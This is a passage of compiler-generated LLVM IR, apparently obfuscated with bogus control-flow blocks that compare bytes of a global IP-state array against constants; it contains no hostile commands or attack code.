  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %310
  %5117 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5118 = zext i8 %5117 to i32
  %5119 = icmp eq i32 %5118, 159
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %330
  %5120 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5121 = zext i8 %5120 to i32
  %5122 = icmp eq i32 %5121, 148
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %350
  %5123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5124 = zext i8 %5123 to i32
  %5125 = icmp eq i32 %5124, 114
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %374
  %5126 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5127 = zext i8 %5126 to i32
  %5128 = icmp eq i32 %5127, 125
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %406
  %5129 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5130 = zext i8 %5129 to i32
  %5131 = icmp eq i32 %5130, 144
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %434
  %5132 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5133 = zext i8 %5132 to i32
  %5134 = icmp eq i32 %5133, 150
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %454
  %5135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5136 = zext i8 %5135 to i32
  %5137 = icmp eq i32 %5136, 157
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %510
  %5138 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5139 = zext i8 %5138 to i32
  %5140 = icmp eq i32 %5139, 229
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %546
  %5141 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5142 = zext i8 %5141 to i32
  %5143 = icmp eq i32 %5142, 161
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %570
  %5144 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5145 = zext i8 %5144 to i32
  %5146 = icmp eq i32 %5145, 162
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %598
  %5147 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5148 = zext i8 %5147 to i32
  %5149 = icmp eq i32 %5148, 96
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %634
  %5150 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5151 = zext i8 %5150 to i32
  %5152 = icmp eq i32 %5151, 155
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %662
  %5153 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5154 = zext i8 %5153 to i32
  %5155 = icmp eq i32 %5154, 158
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %682
  %5156 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5157 = zext i8 %5156 to i32
  %5158 = icmp eq i32 %5157, 156
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %710
  %5159 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5160 = zext i8 %5159 to i32
  %5161 = icmp eq i32 %5160, 44
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %738
  %5162 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5163 = zext i8 %5162 to i32
  %5164 = icmp eq i32 %5163, 168
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %762
  %5165 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5166 = zext i8 %5165 to i32
  %5167 = icmp eq i32 %5166, 168
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %790
  %5168 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5169 = zext i8 %5168 to i32
  %5170 = icmp eq i32 %5169, 59
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %822
  %5171 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5172 = zext i8 %5171 to i32
  %5173 = icmp eq i32 %5172, 30
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %842
  %5174 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5175 = zext i8 %5174 to i32
  %5176 = icmp eq i32 %5175, 117
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %882
  %5177 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5178 = zext i8 %5177 to i32
  %5179 = icmp eq i32 %5178, 207
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %906
  %5180 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5181 = zext i8 %5180 to i32
  %5182 = icmp eq i32 %5181, 209
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %934
  %5183 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5184 = zext i8 %5183 to i32
  %5185 = icmp eq i32 %5184, 70
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %958
  %5186 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5187 = zext i8 %5186 to i32
  %5188 = icmp sge i32 %5187, 16
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %978
  %5189 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5190 = zext i8 %5189 to i32
  %5191 = icmp slt i32 %5190, 32
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %998
  %5192 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5193 = zext i8 %5192 to i32
  %5194 = icmp eq i32 %5193, 100
  br label %originalBB138

originalBB142alteredBB:                           ; preds = %originalBB142, %1046
  %5195 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5196 = zext i8 %5195 to i32
  %5197 = icmp eq i32 %5196, 64
  br label %originalBB142

originalBB146alteredBB:                           ; preds = %originalBB146, %1070
  %5198 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5199 = zext i8 %5198 to i32
  %5200 = icmp slt i32 %5199, 227
  br label %originalBB146

originalBB150alteredBB:                           ; preds = %originalBB150, %1094
  %5201 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5202 = zext i8 %5201 to i32
  %5203 = icmp sge i32 %5202, 35
  br label %originalBB150

originalBB154alteredBB:                           ; preds = %originalBB154, %1126
  %5204 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5205 = zext i8 %5204 to i32
  %5206 = icmp slt i32 %5205, 255
  br label %originalBB154

originalBB158alteredBB:                           ; preds = %originalBB158, %1150
  %5207 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5208 = zext i8 %5207 to i32
  %5209 = icmp sge i32 %5208, 40
  br label %originalBB158

originalBB162alteredBB:                           ; preds = %originalBB162, %1206
  %5210 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5211 = zext i8 %5210 to i32
  %5212 = icmp slt i32 %5211, 235
  br label %originalBB162

originalBB166alteredBB:                           ; preds = %originalBB166, %1226
  %5213 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5214 = zext i8 %5213 to i32
  %5215 = icmp eq i32 %5214, 136
  br label %originalBB166

originalBB170alteredBB:                           ; preds = %originalBB170, %1270
  %5216 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5217 = zext i8 %5216 to i32
  %5218 = icmp sge i32 %5217, 31
  br label %originalBB170

originalBB174alteredBB:                           ; preds = %originalBB174, %1298
  %5219 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5220 = zext i8 %5219 to i32
  %5221 = icmp sge i32 %5220, 1
  br label %originalBB174

originalBB178alteredBB:                           ; preds = %originalBB178, %1322
  %5222 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5223 = zext i8 %5222 to i32
  %5224 = icmp eq i32 %5223, 143
  br label %originalBB178

originalBB182alteredBB:                           ; preds = %originalBB182, %1346
  %5225 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5226 = zext i8 %5225 to i32
  %5227 = icmp slt i32 %5226, 233
  br label %originalBB182

originalBB186alteredBB:                           ; preds = %originalBB186, %1366
  %5228 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5229 = zext i8 %5228 to i32
  %5230 = icmp eq i32 %5229, 144
  br label %originalBB186

originalBB190alteredBB:                           ; preds = %originalBB190, %1398
  %5231 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5232 = zext i8 %5231 to i32
  %5233 = icmp sge i32 %5232, 165
  br label %originalBB190

originalBB194alteredBB:                           ; preds = %originalBB194, %1418
  %5234 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5235 = zext i8 %5234 to i32
  %5236 = icmp slt i32 %5235, 166
  br label %originalBB194

originalBB198alteredBB:                           ; preds = %originalBB198, %1438
  %5237 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5238 = zext i8 %5237 to i32
  %5239 = icmp eq i32 %5238, 147
  br label %originalBB198

originalBB202alteredBB:                           ; preds = %originalBB202, %1462
  %5240 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5241 = zext i8 %5240 to i32
  %5242 = icmp slt i32 %5241, 43
  br label %originalBB202

originalBB206alteredBB:                           ; preds = %originalBB206, %1482
  %5243 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5244 = zext i8 %5243 to i32
  %5245 = icmp eq i32 %5244, 147
  br label %originalBB206

originalBB210alteredBB:                           ; preds = %originalBB210, %1502
  %5246 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5247 = zext i8 %5246 to i32
  %5248 = icmp sge i32 %5247, 103
  br label %originalBB210

originalBB214alteredBB:                           ; preds = %originalBB214, %1526
  %5249 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5250 = zext i8 %5249 to i32
  %5251 = icmp eq i32 %5250, 147
  br label %originalBB214

originalBB218alteredBB:                           ; preds = %originalBB218, %1558
  %5252 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5253 = zext i8 %5252 to i32
  %5254 = icmp sge i32 %5253, 198
  br label %originalBB218

originalBB222alteredBB:                           ; preds = %originalBB222, %1578
  %5255 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5256 = zext i8 %5255 to i32
  %5257 = icmp slt i32 %5256, 200
  br label %originalBB222

originalBB226alteredBB:                           ; preds = %originalBB226, %1614
  %5258 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5259 = zext i8 %5258 to i32
  %5260 = icmp sge i32 %5259, 113
  br label %originalBB226

originalBB230alteredBB:                           ; preds = %originalBB230, %1650
  %5261 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5262 = zext i8 %5261 to i32
  %5263 = icmp eq i32 %5262, 153
  br label %originalBB230

originalBB234alteredBB:                           ; preds = %originalBB234, %1686
  %5264 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5265 = zext i8 %5264 to i32
  %5266 = icmp slt i32 %5265, 10
  br label %originalBB234

originalBB238alteredBB:                           ; preds = %originalBB238, %1714
  %5267 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5268 = zext i8 %5267 to i32
  %5269 = icmp slt i32 %5268, 89
  br label %originalBB238

originalBB242alteredBB:                           ; preds = %originalBB242, %1746
  %5270 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5271 = zext i8 %5270 to i32
  %5272 = icmp eq i32 %5271, 157
  br label %originalBB242

originalBB246alteredBB:                           ; preds = %originalBB246, %1766
  %5273 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5274 = zext i8 %5273 to i32
  %5275 = icmp sge i32 %5274, 150
  br label %originalBB246

originalBB250alteredBB:                           ; preds = %originalBB250, %1806
  %5276 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5277 = zext i8 %5276 to i32
  %5278 = icmp sge i32 %5277, 235
  br label %originalBB250

originalBB254alteredBB:                           ; preds = %originalBB254, %1830
  %5279 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5280 = zext i8 %5279 to i32
  %5281 = icmp eq i32 %5280, 159
  br label %originalBB254

originalBB258alteredBB:                           ; preds = %originalBB258, %1850
  %5282 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5283 = zext i8 %5282 to i32
  %5284 = icmp sge i32 %5283, 120
  br label %originalBB258

originalBB262alteredBB:                           ; preds = %originalBB262, %1894
  %5285 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5286 = zext i8 %5285 to i32
  %5287 = icmp slt i32 %5286, 227
  br label %originalBB262

originalBB266alteredBB:                           ; preds = %originalBB266, %1946
  %5288 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5289 = zext i8 %5288 to i32
  %5290 = icmp slt i32 %5289, 50
  br label %originalBB266

originalBB270alteredBB:                           ; preds = %originalBB270, %1970
  %5291 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5292 = zext i8 %5291 to i32
  %5293 = icmp sge i32 %5292, 217
  br label %originalBB270

originalBB274alteredBB:                           ; preds = %originalBB274, %2014
  %5294 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5295 = zext i8 %5294 to i32
  %5296 = icmp slt i32 %5295, 254
  br label %originalBB274

originalBB278alteredBB:                           ; preds = %originalBB278, %2038
  %5297 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5298 = zext i8 %5297 to i32
  %5299 = icmp sge i32 %5298, 1
  br label %originalBB278

originalBB282alteredBB:                           ; preds = %originalBB282, %2102
  %5300 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5301 = zext i8 %5300 to i32
  %5302 = icmp eq i32 %5301, 159
  br label %originalBB282

originalBB286alteredBB:                           ; preds = %originalBB286, %2138
  %5303 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5304 = zext i8 %5303 to i32
  %5305 = icmp eq i32 %5304, 55
  br label %originalBB286

originalBB290alteredBB:                           ; preds = %originalBB290, %2158
  %5306 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5307 = zext i8 %5306 to i32
  %5308 = icmp eq i32 %5307, 178
  br label %originalBB290

originalBB294alteredBB:                           ; preds = %originalBB294, %2202
  %5309 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5310 = zext i8 %5309 to i32
  %5311 = icmp eq i32 %5310, 170
  br label %originalBB294

originalBB298alteredBB:                           ; preds = %originalBB298, %2226
  %5312 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5313 = zext i8 %5312 to i32
  %5314 = icmp eq i32 %5313, 197
  br label %originalBB298

originalBB302alteredBB:                           ; preds = %originalBB302, %2258
  %5315 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5316 = zext i8 %5315 to i32
  %5317 = icmp eq i32 %5316, 59
  br label %originalBB302

originalBB306alteredBB:                           ; preds = %originalBB306, %2278
  %5318 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5319 = zext i8 %5318 to i32
  %5320 = icmp eq i32 %5319, 146
  br label %originalBB306

originalBB310alteredBB:                           ; preds = %originalBB310, %2306
  %5321 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5322 = zext i8 %5321 to i32
  %5323 = icmp slt i32 %5322, 191
  br label %originalBB310

originalBB314alteredBB:                           ; preds = %originalBB314, %2354
  %5324 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5325 = zext i8 %5324 to i32
  %5326 = icmp slt i32 %5325, 127
  br label %originalBB314

originalBB318alteredBB:                           ; preds = %originalBB318, %2374
  %5327 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5328 = zext i8 %5327 to i32
  %5329 = icmp eq i32 %5328, 192
  br label %originalBB318

originalBB322alteredBB:                           ; preds = %originalBB322, %2398
  %5330 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5331 = zext i8 %5330 to i32
  %5332 = icmp sge i32 %5331, 128
  br label %originalBB322

originalBB326alteredBB:                           ; preds = %originalBB326, %2438
  %5333 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5334 = zext i8 %5333 to i32
  %5335 = icmp eq i32 %5334, 198
  br label %originalBB326

originalBB330alteredBB:                           ; preds = %originalBB330, %2462
  %5336 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5337 = zext i8 %5336 to i32
  %5338 = icmp sge i32 %5337, 96
  br label %originalBB330

originalBB334alteredBB:                           ; preds = %originalBB334, %2510
  %5339 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5340 = zext i8 %5339 to i32
  %5341 = icmp sge i32 %5340, 1
  br label %originalBB334

originalBB338alteredBB:                           ; preds = %originalBB338, %2538
  %5342 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5343 = zext i8 %5342 to i32
  %5344 = icmp eq i32 %5343, 207
  br label %originalBB338

originalBB342alteredBB:                           ; preds = %originalBB342, %2558
  %5345 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5346 = zext i8 %5345 to i32
  %5347 = icmp sge i32 %5346, 64
  br label %originalBB342

originalBB346alteredBB:                           ; preds = %originalBB346, %2578
  %5348 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5349 = zext i8 %5348 to i32
  %5350 = icmp slt i32 %5349, 95
  br label %originalBB346

originalBB350alteredBB:                           ; preds = %originalBB350, %2598
  %5351 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5352 = zext i8 %5351 to i32
  %5353 = icmp eq i32 %5352, 67
  br label %originalBB350

originalBB354alteredBB:                           ; preds = %originalBB354, %2626
  %5354 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5355 = zext i8 %5354 to i32
  %5356 = icmp slt i32 %5355, 191
  br label %originalBB354

originalBB358alteredBB:                           ; preds = %originalBB358, %2646
  %5357 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5358 = zext i8 %5357 to i32
  %5359 = icmp eq i32 %5358, 80
  br label %originalBB358

originalBB362alteredBB:                           ; preds = %originalBB362, %2682
  %5360 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5361 = zext i8 %5360 to i32
  %5362 = icmp eq i32 %5361, 196
  br label %originalBB362

originalBB366alteredBB:                           ; preds = %originalBB366, %2714
  %5363 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5364 = zext i8 %5363 to i32
  %5365 = icmp eq i32 %5364, 85
  br label %originalBB366

originalBB370alteredBB:                           ; preds = %originalBB370, %2734
  %5366 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5367 = zext i8 %5366 to i32
  %5368 = icmp sge i32 %5367, 8
  br label %originalBB370

originalBB374alteredBB:                           ; preds = %originalBB374, %2758
  %5369 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5370 = zext i8 %5369 to i32
  %5371 = icmp eq i32 %5370, 64
  br label %originalBB374

originalBB378alteredBB:                           ; preds = %originalBB378, %2818
  %5372 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5373 = zext i8 %5372 to i32
  %5374 = icmp slt i32 %5373, 191
  br label %originalBB378

originalBB382alteredBB:                           ; preds = %originalBB382, %2850
  %5375 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5376 = zext i8 %5375 to i32
  %5377 = icmp slt i32 %5376, 31
  br label %originalBB382

originalBB386alteredBB:                           ; preds = %originalBB386, %2878
  %5378 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5379 = zext i8 %5378 to i32
  %5380 = icmp sge i32 %5379, 232
  br label %originalBB386

originalBB390alteredBB:                           ; preds = %originalBB390, %2902
  %5381 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5382 = zext i8 %5381 to i32
  %5383 = icmp eq i32 %5382, 66
  br label %originalBB390

originalBB394alteredBB:                           ; preds = %originalBB394, %2962
  %5384 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5385 = zext i8 %5384 to i32
  %5386 = icmp slt i32 %5385, 159
  br label %originalBB394

originalBB398alteredBB:                           ; preds = %originalBB398, %2986
  %5387 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5388 = zext i8 %5387 to i32
  %5389 = icmp eq i32 %5388, 61
  br label %originalBB398

originalBB402alteredBB:                           ; preds = %originalBB402, %3022
  %5390 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5391 = zext i8 %5390 to i32
  %5392 = icmp sge i32 %5391, 144
  br label %originalBB402

originalBB406alteredBB:                           ; preds = %originalBB406, %3042
  %5393 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5394 = zext i8 %5393 to i32
  %5395 = icmp slt i32 %5394, 148
  br label %originalBB406

originalBB410alteredBB:                           ; preds = %originalBB410, %3070
  %5396 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5397 = zext i8 %5396 to i32
  %5398 = icmp sge i32 %5397, 21
  br label %originalBB410

originalBB414alteredBB:                           ; preds = %originalBB414, %3094
  %5399 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5400 = zext i8 %5399 to i32
  %5401 = icmp eq i32 %5400, 185
  br label %originalBB414

originalBB418alteredBB:                           ; preds = %originalBB418, %3130
  %5402 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5403 = zext i8 %5402 to i32
  %5404 = icmp eq i32 %5403, 62
  br label %originalBB418

originalBB422alteredBB:                           ; preds = %originalBB422, %3166
  %5405 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5406 = zext i8 %5405 to i32
  %5407 = icmp sge i32 %5406, 120
  br label %originalBB422

originalBB426alteredBB:                           ; preds = %originalBB426, %3226
  %5408 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5409 = zext i8 %5408 to i32
  %5410 = icmp eq i32 %5409, 251
  br label %originalBB426

originalBB430alteredBB:                           ; preds = %originalBB430, %3250
  %5411 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5412 = zext i8 %5411 to i32
  %5413 = icmp slt i32 %5412, 21
  br label %originalBB430

originalBB434alteredBB:                           ; preds = %originalBB434, %3298
  %5414 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5415 = zext i8 %5414 to i32
  %5416 = icmp slt i32 %5415, 115
  br label %originalBB434

originalBB438alteredBB:                           ; preds = %originalBB438, %3334
  %5417 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5418 = zext i8 %5417 to i32
  %5419 = icmp eq i32 %5418, 188
  br label %originalBB438

originalBB442alteredBB:                           ; preds = %originalBB442, %3362
  %5420 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5421 = zext i8 %5420 to i32
  %5422 = icmp slt i32 %5421, 53
  br label %originalBB442

originalBB446alteredBB:                           ; preds = %originalBB446, %3386
  %5423 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5424 = zext i8 %5423 to i32
  %5425 = icmp eq i32 %5424, 165
  br label %originalBB446

originalBB450alteredBB:                           ; preds = %originalBB450, %3422
  %5426 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5427 = zext i8 %5426 to i32
  %5428 = icmp eq i32 %5427, 164
  br label %originalBB450

originalBB454alteredBB:                           ; preds = %originalBB454, %3450
  %5429 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5430 = zext i8 %5429 to i32
  %5431 = icmp eq i32 %5430, 31
  br label %originalBB454

originalBB458alteredBB:                           ; preds = %originalBB458, %3474
  %5432 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5433 = zext i8 %5432 to i32
  %5434 = icmp eq i32 %5433, 114
  br label %originalBB458

originalBB462alteredBB:                           ; preds = %originalBB462, %3506
  %5435 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5436 = zext i8 %5435 to i32
  %5437 = icmp eq i32 %5436, 33
  br label %originalBB462

originalBB466alteredBB:                           ; preds = %originalBB466, %3558
